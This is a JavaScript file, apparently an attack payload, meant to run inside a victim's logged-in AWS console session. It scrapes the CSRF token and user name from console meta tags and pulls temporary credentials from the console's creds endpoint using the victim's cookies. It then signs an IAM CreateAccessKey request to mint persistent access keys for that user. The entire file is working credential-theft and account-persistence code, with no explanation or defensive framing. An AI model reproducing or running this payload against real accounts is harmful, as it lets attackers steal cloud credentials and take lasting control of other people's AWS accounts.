// Function to extract csrfToken from the 'tb-data' meta tag and displayName from the 'awsc-session-data' meta tag
function extractDataFromMeta(responseBody) {
    // Create a dummy element to parse the response HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(responseBody, 'text/html');
    
    // Extract CSRF Token from 'tb-data' meta tag
    const tbMetaTag = doc.querySelector('meta[name="tb-data"]');
    let csrfToken = null;
    if (tbMetaTag) {
        const tbContent = tbMetaTag.getAttribute('content');
        const tbParsedContent = JSON.parse(tbContent.replace(/&quot;/g, '"')); // Convert HTML entities to string
        csrfToken = tbParsedContent.csrfToken;
    }
    
    // Extract displayName from 'awsc-session-data' meta tag
    const sessionMetaTag = doc.querySelector('meta[name="awsc-session-data"]');
    let displayName = null;
    if (sessionMetaTag) {
        const sessionContent = sessionMetaTag.getAttribute('content');
        const sessionParsedContent = JSON.parse(sessionContent.replace(/&#34;/g, '"')); // Convert HTML entities to string
        displayName = sessionParsedContent.displayName;
    }

    return { csrfToken, displayName }; // Return both csrfToken and displayName
}

// First GET request to fetch the HTML and extract CSRF token and displayName
async function fetchInitialData(url) {
    try {
        const response = await fetch(url, {
            method: 'GET',
            credentials: 'include', // Automatically include HttpOnly cookies from the browser
            headers: {
                'Content-Type': 'text/html'
            }
        });

        const responseBody = await response.text(); // Get response as text (HTML)
        const { csrfToken, displayName } = extractDataFromMeta(responseBody);
        return { csrfToken, displayName };
    } catch (error) {
        console.error('Error fetching CSRF token and displayName:', error);
    }
}

// Second POST request with the CSRF token to fetch access keys
async function fetchAccessKeys(url, csrfToken, displayName) {
    console.log('Display Name:', displayName);
    try {
        const response = await fetch(url, {
            method: 'POST', // Updated to POST request
            credentials: 'include', // Automatically include HttpOnly cookies from the browser
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken // CSRF token from the first request
            },
            body: JSON.stringify({}) // You may need to provide specific data here if required by the API
        });

        const data = await response.json(); // Parse the response as JSON
        // Utility functions for encoding and decoding
        function toUint8Array(str) {
            return new TextEncoder().encode(str);
        }

        function fromUint8Array(uint8array) {
            return new TextDecoder().decode(uint8array);
        }

        function toHex(arrayBuffer) {
            return Array.from(new Uint8Array(arrayBuffer))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

        // SHA256 hash function
        async function sha256(message) {
            const data = toUint8Array(message);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            return toHex(hashBuffer);
        }

        // HMAC SHA256 function
        async function hmac(key, message) {
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                key,
                { name: 'HMAC', hash: { name: 'SHA-256' } },
                false,
                ['sign']
            );
            const signature = await crypto.subtle.sign('HMAC', cryptoKey, message);
            return signature; // Return ArrayBuffer
        }

        // Function to get the signing key
        async function getSignatureKey(key, dateStamp, regionName, serviceName) {
            const kDate = await hmac(toUint8Array('AWS4' + key), toUint8Array(dateStamp));
            const kRegion = await hmac(kDate, toUint8Array(regionName));
            const kService = await hmac(kRegion, toUint8Array(serviceName));
            const kSigning = await hmac(kService, toUint8Array('aws4_request'));
            return kSigning; // Return ArrayBuffer
        }

        async function signRequest() {
            // AWS Configuration
            const accessKeyId = data.accessKeyId;
            const secretAccessKey = data.secretAccessKey;
            const sessionToken = data.sessionToken; 
            const region = 'us-east-1';
            const service = 'iam';
            const host = 'iam.amazonaws.com';
            const method = 'POST';
            const canonicalUri = '/';
            const contentType = 'application/x-www-form-urlencoded; charset=utf-8';
            const payload = 'Action=CreateAccessKey&UserName='+displayName+'&Version=2010-05-08';

            // Hash the payload
            const hashedPayload = await sha256(payload);

            // Current date/time
            const now = new Date();
            const amzDate = now.toISOString().replace(/[:-]|\.\d{3}/g, ''); // YYYYMMDDTHHMMSSZ format
            const dateStamp = now.toISOString().substring(0, 10).replace(/-/g, ''); // YYYYMMDD format

            // Canonical Headers
            const canonicalHeaders = `host:${host}\n` +
                                    `x-amz-content-sha256:${hashedPayload}\n` +
                                    `x-amz-date:${amzDate}\n` +
                                    `x-amz-security-token:${sessionToken}\n` +
                                    `x-amz-user-agent:aws-sdk-js/2.1687.0 promise\n`;

            // Signed Headers
            const signedHeaders = 'host;x-amz-content-sha256;x-amz-date;x-amz-security-token;x-amz-user-agent';

            // Canonical Request
            const canonicalRequest = `${method}\n${canonicalUri}\n\n${canonicalHeaders}\n${signedHeaders}\n${hashedPayload}`;

            // String to Sign
            const algorithm = 'AWS4-HMAC-SHA256';
            const credentialScope = `${dateStamp}/${region}/${service}/aws4_request`;
            const hashedCanonicalRequest = await sha256(canonicalRequest);
            const stringToSign = `${algorithm}\n${amzDate}\n${credentialScope}\n${hashedCanonicalRequest}`;

            // Calculate the Signature
            const signingKey = await getSignatureKey(secretAccessKey, dateStamp, region, service);
            const signatureArrayBuffer = await hmac(signingKey, toUint8Array(stringToSign));
            const signature = toHex(signatureArrayBuffer);

            // Authorization Header
            const authorizationHeader = `${algorithm} Credential=${accessKeyId}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;

            // Headers for the request
            const headers = {
                'Authorization': authorizationHeader,
                'Content-Type': contentType,
                'X-Amz-Date': amzDate,
                'X-Amz-Content-Sha256': hashedPayload,
                'X-Amz-Security-Token': sessionToken,
                'X-Amz-User-Agent': 'aws-sdk-js/2.1687.0 promise',
            };


            // Send the request using fetch
            const response = await fetch(`https://${host}${canonicalUri}`, {
                method: method,
                headers: headers,
                body: payload,
            });

            const responseBody = await response.text();
            alert(responseBody);
        }

        // Run the signRequest function
        signRequest().catch(console.error);
        
    } catch (error) {
        console.error('Error fetching access keys:', error);
    }
}

// Main function to execute the requests
async function main() {
    const csrfTokenUrl = 'https://us-east-1.console.aws.amazon.com/iam/home?region=us-east-1'; // URL to fetch the CSRF token
    const accessKeysUrl = 'https://us-east-1.console.aws.amazon.com/iam/tb/creds'; // URL to fetch access keys

    // Step 1: Get the CSRF token and displayName
    const { csrfToken, displayName } = await fetchInitialData(csrfTokenUrl);
    //console.log('CSRF Token:', csrfToken);
    // console.log('Display Name:', displayName);

    if (csrfToken && displayName) {
        // Step 2: Use the CSRF token to make the POST request and get the access keys
        fetchAccessKeys(accessKeysUrl, csrfToken, displayName);
    }
}

main();
